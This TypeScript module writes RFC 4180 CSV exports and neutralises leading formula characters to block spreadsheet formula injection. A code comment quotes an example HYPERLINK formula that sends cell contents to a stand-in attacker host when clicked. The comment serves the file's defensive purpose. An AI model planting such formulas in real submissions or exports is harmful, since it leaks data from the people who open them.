/**
 * RFC 4180 CSV writing, with the two escapes a spreadsheet actually needs.
 *
 * This replaced `xlsx`, which carried CVE-2023-30533 (prototype pollution) and
 * a ReDoS advisory with no fixed version published to npm. It was a 425 kB
 * spreadsheet engine used for one thing: writing a single flat sheet of
 * strings. CSV covers that, opens in Excel on double-click, and is no
 * dependency at all.
 */

/**
 * Characters that make Excel, LibreOffice and Google Sheets treat a cell as a
 * formula rather than text.
 *
 * This matters more here than in most exports: the values are typed by
 * respondents into a public form, so a cell like
 * `=HYPERLINK("https://evil.test?"&A1,"Click")` is submitted by a stranger and
 * executes when an admin opens the export. The xlsx path had the same hole.
 */
const FORMULA_PREFIXES = ['=', '+', '-', '@', '\t', '\r'];

/**
 * Neutralises a leading formula character by prefixing a single quote, which
 * spreadsheets read as "the rest is literal text" and do not display.
 */
function defuse(value: string): string {
  return FORMULA_PREFIXES.some(prefix => value.startsWith(prefix)) ? `'${value}` : value;
}

/** Quotes a field if it contains a delimiter, quote or newline; doubles inner quotes. */
function escapeField(value: string): string {
  const safe = defuse(value);
  return /[",\r\n]/.test(safe) ? `"${safe.replaceAll('"', '""')}"` : safe;
}

/**
 * Serialises `header` plus `rows` as CSV text.
 *
 * CRLF line endings, per RFC 4180 — Excel on Windows treats a bare LF inside a
 * quoted field inconsistently.
 */
export function toCsv(header: string[], rows: string[][]): string {
  return [header, ...rows].map(row => row.map(escapeField).join(',')).join('\r\n');
}

/**
 * Triggers a download of `content` as a UTF-8 CSV file.
 *
 * The BOM is not optional: without it Excel decodes the file as the system
 * ANSI codepage, and every Arabic answer in this app's exports arrives as
 * mojibake.
 */
export function downloadCsv(filename: string, content: string): void {
  // Written as an escape, not the literal character: a bare BOM in source is
  // invisible and gets dropped by editors and formatters without a trace.
  const blob = new Blob(['\uFEFF' + content], { type: 'text/csv;charset=utf-8' });
  const url = URL.createObjectURL(blob);

  const link = document.createElement('a');
  link.href = url;
  link.download = filename;
  link.style.display = 'none';
  document.body.appendChild(link);
  link.click();
  link.remove();

  // Revoking immediately can cancel the download in some browsers; one turn of
  // the event loop is enough for the click to have been dispatched.
  setTimeout(() => URL.revokeObjectURL(url), 0);
}
